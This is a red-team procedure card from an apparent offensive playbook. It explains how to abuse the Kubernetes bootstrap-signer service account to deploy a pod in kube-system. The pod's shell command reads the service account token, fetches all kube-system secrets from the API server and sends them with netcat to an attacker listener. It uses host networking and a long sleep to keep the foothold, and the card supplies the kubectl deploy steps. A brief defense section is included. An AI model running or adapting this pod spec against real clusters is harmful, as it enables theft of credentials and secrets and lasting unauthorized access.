---
id: d41d97be-258d-4bbb-9466-bf47f16ab6a8
name: Abuse-Kubernetes-Bootstrap-Signer-RBAC-to-Deploy-Malicious-Pod
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:01.257266+00:00'
updated_at: '2023-04-10T20:34:03.113570+00:00'
tactics:
  - '[[Persistence]]'
  - '[[Privilege Escalation]]'
techniques:
  - '[[T1078.004]]'
  - '[[Deploy Container]]'
  - '[[Exfiltration Over Alternative Protocol]]'
sub_techniques: []
tags:
  - '[[tags/Kubernetes]]'
  - '[[tags/Pod Creation]]'
  - '[[tags/RBAC Configuration]]'
  - rbac-abuse
  - data-exfiltration
  - persistence
commands:
  - '[[commands/kubectl-get-bootstrap-signer-role-yaml]]'
  - '[[commands/kubectl-apply-malicious-pod-yaml]]'
platforms:
  - Kubernetes
  - Linux
tools: []
validated: true
---

# Abuse-Kubernetes-Bootstrap-Signer-RBAC-to-Deploy-Malicious-Pod

## Summary

This procedure demonstrates how an attacker with authenticated access to a Kubernetes cluster can abuse the bootstrap-signer service account's RBAC permissions to deploy a malicious pod. The pod uses host networking and mounts the service account token to query and exfiltrate secrets from the Kubernetes API server to an attacker-controlled endpoint, enabling persistence and data theft within the cluster.

## Description

In Kubernetes environments, the bootstrap-signer service account in the kube-system namespace often has elevated permissions for bootstrapping controller processes. An attacker who has obtained credentials or access to this account can leverage these permissions to create pods that execute arbitrary commands. This procedure involves verifying the role permissions, defining a malicious pod YAML that runs an Alpine container to fetch secrets via the API and exfiltrate them using netcat, and applying the pod to the cluster. The pod's hostNetwork: true setting allows it to bypass network policies, and automountServiceAccountToken: true ensures the token is available for API authentication. Successful execution grants the attacker access to sensitive data like secrets and enables further lateral movement or persistence in the cluster. This technique is particularly effective in misconfigured clusters where service accounts have overly permissive roles.

## Requirements

1. Authenticated access to the Kubernetes cluster via kubectl with a token or certificate tied to a user or service account that can read roles in kube-system.
2. Permissions to create pods in the kube-system namespace, typically granted via the bootstrap-signer role or equivalent RBAC binding.
3. Access to kubectl tool installed on the attacker's machine.
4. An attacker-controlled IP and port for receiving exfiltrated data (e.g., a netcat listener).

## Defense

- Implement least-privilege RBAC policies to restrict service account permissions, ensuring bootstrap-signer and similar accounts cannot create pods or access secrets unnecessarily.
- Monitor Kubernetes API server audit logs for unauthorized pod creations, especially in kube-system namespace, and anomalous API calls from service accounts.
- Enable network policies to restrict pod-to-API-server traffic and block outbound connections to untrusted IPs/ports.
- Regularly audit service account tokens and rotate them; use tools like kube-bench for RBAC compliance checks.

## Objectives

1. Verify permissions of the bootstrap-signer role to confirm pod creation capabilities.
2. Deploy a malicious pod that authenticates to the API server and exfiltrates secrets.
3. Establish persistence in the cluster by maintaining the pod for ongoing access and data theft.

## Instructions

### Step 1: Verify Bootstrap Signer Role Permissions

**Context**: Before deploying the pod, confirm the permissions associated with the bootstrap-signer role in the kube-system namespace. This step ensures the service account has the necessary RBAC to create pods and access the API, preventing deployment failures due to insufficient privileges.

**Command** ([[commands/kubectl-get-bootstrap-signer-role-yaml]]):
```bash
kubectl get role system:controller:bootstrap-signer -n kube-system -o yaml
```

> This command retrieves the YAML definition of the role, allowing you to inspect rules for actions like 'create' on 'pods' resources. If the role lacks pod creation permissions, the subsequent deployment will fail with a 403 Forbidden error.

**Expected Output**: A YAML output showing the role's rules, such as:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: system:controller:bootstrap-signer
  namespace: kube-system
rules:
- apiGroups:
  - ""
  resources:
  - "pods"
  verbs:
  - "create"
  - "get"
  # ... additional rules
```

### Step 2: Define Malicious Pod Configuration

**Context**: Create a YAML file defining the malicious pod that will mount the service account token, use host networking for unrestricted access, and execute a command to fetch and exfiltrate secrets from the kube-system namespace.

**Code** ([[codes/Kubernetes-Malicious-Alpine-Pod-YAML-for-Secret-Exfiltration]]):

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: alpine
  namespace: kube-system
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
  serviceAccountName: bootstrap-signer
  automountServiceAccountToken: true
  hostNetwork: true
```

> Save this YAML to a file named 'malicious-pod.yaml'. The command inside the container updates the Alpine image, reads the mounted token, uses curl to query secrets via the API (replacing the hardcoded API endpoint with your cluster's), pipes the output to netcat for exfiltration to the attacker's listener, and sleeps to maintain the pod. Replace the hardcoded IP (192.168.154.228) and ports (8443 for API, 6666 for exfil) with your environment specifics before applying.

**Expected Output**: A valid YAML file created on disk, verifiable by running `cat malicious-pod.yaml` to ensure syntax and structure are correct.

### Step 3: Deploy the Malicious Pod

**Context**: Apply the defined pod YAML to the cluster, initiating the execution of the malicious payload. This step leverages the bootstrap-signer service account's permissions to schedule the pod, which will then authenticate and exfiltrate data.

**Command** ([[commands/kubectl-apply-malicious-pod-yaml]]):
```bash
kubectl apply -f malicious-pod.yaml
```

> This command creates the pod in the kube-system namespace. Monitor the pod status with `kubectl get pods -n kube-system` to confirm it enters the Running state. If successful, the pod will execute the args command, fetching secrets and sending them to your netcat listener (e.g., `nc -lvnp 6666` on the attacker machine).

**Expected Output**: Confirmation message like:

```
pod/alpine created
```

Followed by pod status:

```
NAME     READY   STATUS    RESTARTS   AGE
alpine   1/1     Running   0          10s
```
